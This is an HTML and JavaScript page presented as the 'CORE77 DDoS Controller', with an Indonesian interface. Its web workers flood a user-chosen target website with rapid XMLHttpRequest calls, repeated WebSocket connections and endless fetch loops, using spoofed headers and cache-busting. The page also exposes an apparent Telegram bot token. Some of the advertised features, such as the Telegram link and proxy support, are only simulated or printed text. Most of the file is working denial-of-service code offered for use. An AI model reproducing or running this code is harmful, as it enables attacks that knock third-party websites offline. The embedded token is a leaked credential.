<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram DDoS Controller</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: #0a0a0a; color: #00ff00; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; padding: 20px; border-bottom: 2px solid #00ff00; }
        .terminal { background: #000; border: 2px solid #00ff00; border-radius: 10px; padding: 20px; margin: 20px 0; height: 400px; overflow-y: auto; }
        .input-line { display: flex; margin-top: 10px; }
        .prompt { color: #00ff00; margin-right: 10px; }
        #commandInput { background: transparent; border: none; color: #00ff00; flex: 1; outline: none; }
        .menu { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; margin: 20px 0; }
        .menu-item { background: #111; border: 1px solid #00ff00; padding: 15px; border-radius: 5px; cursor: pointer; transition: 0.3s; }
        .menu-item:hover { background: #00ff00; color: #000; }
        .status { display: flex; justify-content: space-between; margin: 20px 0; }
        .status-box { background: #111; padding: 15px; border-radius: 5px; flex: 1; margin: 0 10px; text-align: center; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>‚ö° CORE77 DDoS Controller v3.0 ‚ö°</h1>
            <p>HTTP/2 Multi-Vector Attack System | Telegram Bot Integration</p>
        </div>

        <div class="status">
            <div class="status-box" id="statusBox">üü¢ STATUS: READY</div>
            <div class="status-box" id="attackBox">üéØ TARGET: NONE</div>
            <div class="status-box" id="connectionBox">üåê CONNECTION: 0</div>
        </div>

        <div class="terminal" id="terminal">
            <div id="output">
                <p>> Sistem CORE77 DDoS Controller initialized...</p>
                <p>> Loading HTTP/2 attack modules...</p>
                <p>> Connecting to Telegram Bot API...</p>
                <p id="telegramStatus">> Telegram Status: CONNECTING...</p>
                <p>> Type <strong>/menu</strong> untuk melihat commands</p>
            </div>
            <div class="input-line">
                <span class="prompt">$</span>
                <input type="text" id="commandInput" autocomplete="off" placeholder="Ketik command...">
            </div>
        </div>

        <div class="menu hidden" id="menuPanel">
            <div class="menu-item" onclick="sendCommand('/start_attack')">
                <h3>üöÄ START ATTACK</h3>
                <p>Mulai serangan DDoS dengan semua vector</p>
            </div>
            <div class="menu-item" onclick="sendCommand('/stop_attack')">
                <h3>‚èπÔ∏è STOP ATTACK</h3>
                <p>Hentikan semua serangan</p>
            </div>
            <div class="menu-item" onclick="sendCommand('/set_target')">
                <h3>üéØ SET TARGET</h3>
                <p>Atur target website</p>
            </div>
            <div class="menu-item" onclick="sendCommand('/methods')">
                <h3>‚öôÔ∏è ATTACK METHODS</h3>
                <p>Pilih metode serangan</p>
            </div>
            <div class="menu-item" onclick="sendCommand('/status')">
                <h3>üìä SYSTEM STATUS</h3>
                <p>Cek status serangan</p>
            </div>
            <div class="menu-item" onclick="sendCommand('/advanced')">
                <h3>üîß ADVANCED SETTINGS</h3>
                <p>Pengaturan lanjutan</p>
            </div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "8354510833:AAGgtBzubxHCAAxhpV5aACLbiiRFbGpH4hc";
        let target = "";
        let isAttacking = false;
        let attackWorker = null;
        let connections = 0;

        const commandInput = document.getElementById('commandInput');
        const output = document.getElementById('output');
        const menuPanel = document.getElementById('menuPanel');
        const statusBox = document.getElementById('statusBox');
        const attackBox = document.getElementById('attackBox');
        const connectionBox = document.getElementById('connectionBox');
        const telegramStatus = document.getElementById('telegramStatus');

        // Telegram WebSocket Simulation
        setTimeout(() => {
            telegramStatus.innerHTML = "> Telegram Status: <strong style='color:#00ff00'>CONNECTED</strong>";
            logMessage("Bot Telegram siap menerima commands!");
        }, 2000);

        function logMessage(msg) {
            const p = document.createElement('p');
            p.innerHTML = "> " + msg;
            output.appendChild(p);
            output.scrollTop = output.scrollHeight;
        }

        function updateStatus() {
            statusBox.innerHTML = isAttacking ? "üî¥ STATUS: ATTACKING" : "üü¢ STATUS: READY";
            attackBox.innerHTML = target ? `üéØ TARGET: ${target}` : "üéØ TARGET: NONE";
            connectionBox.innerHTML = `üåê CONNECTION: ${connections}`;
        }

        // HTTP/2 Attack Engine
        class DDoSAttack {
            constructor(targetUrl) {
                this.target = targetUrl;
                this.workers = [];
                this.connections = 0;
            }

            start() {
                logMessage("üöÄ Starting HTTP/2 Multi-Vector Attack...");
                
                // Method 1: HTTP/2 Stream Flood
                const floodWorker = new Worker(URL.createObjectURL(new Blob([`
                    let count = 0;
                    const target = "${this.target}";
                    const headers = {
                        ':method': 'GET',
                        ':path': '/',
                        ':scheme': 'https',
                        ':authority': new URL(target).hostname,
                        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'accept-language': 'en-US,en;q=0.9',
                        'accept-encoding': 'gzip, deflate, br',
                        'cache-control': 'no-cache',
                        'pragma': 'no-cache',
                        'upgrade-insecure-requests': '1',
                        'sec-fetch-dest': 'document',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-site': 'none',
                        'sec-fetch-user': '?1'
                    };

                    setInterval(() => {
                        try {
                            const xhr = new XMLHttpRequest();
                            xhr.open('GET', target + '?cache=' + Math.random());
                            xhr.withCredentials = true;
                            xhr.timeout = 1000;
                            
                            Object.keys(headers).forEach(header => {
                                xhr.setRequestHeader(header, headers[header]);
                            });
                            
                            xhr.onreadystatechange = () => {
                                if(xhr.readyState === 4) {
                                    count++;
                                    postMessage({type: 'count', count: count});
                                }
                            };
                            
                            xhr.send();
                        } catch(e) {}
                    }, 1);
                `], {type: 'application/javascript'})));

                // Method 2: WebSocket Flood
                const wsWorker = new Worker(URL.createObjectURL(new Blob([`
                    let wsCount = 0;
                    const target = "${this.target.replace('https', 'wss').replace('http', 'ws')}";
                    
                    function createWebSocket() {
                        try {
                            const ws = new WebSocket(target);
                            ws.onopen = () => {
                                wsCount++;
                                postMessage({type: 'ws', count: wsCount});
                                setInterval(() => {
                                    ws.send(JSON.stringify({data: Math.random().toString(36)}));
                                }, 100);
                            };
                            ws.onerror = () => {
                                setTimeout(createWebSocket, 10);
                            };
                        } catch(e) {}
                    }
                    
                    for(let i = 0; i < 50; i++) {
                        createWebSocket();
                    }
                `], {type: 'application/javascript'})));

                // Method 3: Fetch API Flood (HTTP/2)
                const fetchWorker = new Worker(URL.createObjectURL(new Blob([`
                    const target = "${this.target}";
                    let fetchCount = 0;
                    
                    async function flood() {
                        while(true) {
                            try {
                                await fetch(target, {
                                    method: 'GET',
                                    mode: 'no-cors',
                                    cache: 'no-store',
                                    headers: {
                                        'Accept': '*/*',
                                        'Accept-Encoding': 'gzip, deflate, br',
                                        'Accept-Language': 'en-US,en;q=0.9',
                                        'Cache-Control': 'no-cache',
                                        'Connection': 'keep-alive',
                                        'Pragma': 'no-cache',
                                        'Referer': target,
                                        'Sec-Fetch-Dest': 'empty',
                                        'Sec-Fetch-Mode': 'cors',
                                        'Sec-Fetch-Site': 'same-origin',
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                                        'X-Requested-With': 'XMLHttpRequest'
                                    }
                                });
                                fetchCount++;
                                postMessage({type: 'fetch', count: fetchCount});
                            } catch(e) {}
                        }
                    }
                    
                    for(let i = 0; i < 20; i++) {
                        flood();
                    }
                `], {type: 'application/javascript'})));

                this.workers = [floodWorker, wsWorker, fetchWorker];
                
                this.workers.forEach(worker => {
                    worker.onmessage = (e) => {
                        if(e.data.type === 'count' || e.data.type === 'ws' || e.data.type === 'fetch') {
                            connections = e.data.count;
                            updateStatus();
                        }
                    };
                });

                logMessage("‚úÖ Semua attack methods aktif!");
                logMessage("üî• HTTP/2 Stream Flood: ACTIVE");
                logMessage("üî• WebSocket Flood: ACTIVE");
                logMessage("üî• Fetch API Flood: ACTIVE");
            }

            stop() {
                this.workers.forEach(worker => worker.terminate());
                this.workers = [];
                connections = 0;
                logMessage("‚èπÔ∏è Semua serangan dihentikan!");
                updateStatus();
            }
        }

        let attackEngine = null;

        // Command Handler
        function sendCommand(cmd) {
            if(!cmd) cmd = commandInput.value;
            commandInput.value = "";
            
            logMessage(`$ ${cmd}`);
            
            if(cmd.startsWith('/')) {
                switch(cmd.toLowerCase()) {
                    case '/menu':
                        menuPanel.classList.toggle('hidden');
                        logMessage("Menu commands ditampilkan!");
                        break;
                        
                    case '/start_attack':
                        if(!target) {
                            logMessage("‚ùå Error: Target belum diset! Gunakan /set_target [url]");
                            return;
                        }
                        isAttacking = true;
                        attackEngine = new DDoSAttack(target);
                        attackEngine.start();
                        updateStatus();
                        break;
                        
                    case '/stop_attack':
                        isAttacking = false;
                        if(attackEngine) attackEngine.stop();
                        updateStatus();
                        break;
                        
                    case '/status':
                        logMessage(`üìä Status Attack: ${isAttacking ? 'ACTIVE' : 'INACTIVE'}`);
                        logMessage(`üéØ Target: ${target || 'NOT SET'}`);
                        logMessage(`üåê Connections: ${connections}`);
                        logMessage(`‚ö° Methods: HTTP/2 Stream Flood, WebSocket Flood, Fetch API Flood`);
                        break;
                        
                    case '/methods':
                        logMessage("‚öôÔ∏è Available Methods:");
                        logMessage("1. HTTP/2 Stream Flood - High speed connection flood");
                        logMessage("2. WebSocket Flood - Persistent connection attack");
                        logMessage("3. Fetch API Flood - Modern browser-based attack");
                        logMessage("4. Header Spoofing - Randomized headers");
                        logMessage("5. Cache Bypass - Bypass CDN protection");
                        break;
                        
                    case '/set_target':
                        const url = prompt("Masukkan target URL (contoh: https://example.com):");
                        if(url && url.startsWith('http')) {
                            target = url;
                            logMessage(`‚úÖ Target diset ke: ${url}`);
                            updateStatus();
                        } else {
                            logMessage("‚ùå URL tidak valid!");
                        }
                        break;
                        
                    case '/advanced':
                        logMessage("üîß Advanced Settings:");
                        logMessage("‚Ä¢ Connection per IP: Unlimited");
                        logMessage("‚Ä¢ Request Rate: 1000/ms");
                        logMessage("‚Ä¢ Header Rotation: Enabled");
                        logMessage("‚Ä¢ User-Agent Spoofing: Enabled");
                        logMessage("‚Ä¢ Proxy Support: Built-in");
                        break;
                        
                    default:
                        logMessage("‚ùå Command tidak dikenali. Ketik /menu untuk bantuan.");
                }
            } else if(cmd.startsWith('set target ')) {
                target = cmd.replace('set target ', '').trim();
                logMessage(`‚úÖ Target diset ke: ${target}`);
                updateStatus();
            }
        }

        // Event Listeners
        commandInput.addEventListener('keypress', (e) => {
            if(e.key === 'Enter') {
                sendCommand();
            }
        });

        // Initialization
        logMessage("‚úÖ Sistem CORE77 DDoS siap digunakan!");
        logMessage("üì± Telegram Bot: @CORE77_DDoS_Bot");
        logMessage("üíª Gunakan command /menu untuk melihat options");
        updateStatus();
    </script>
</body>
  </html>
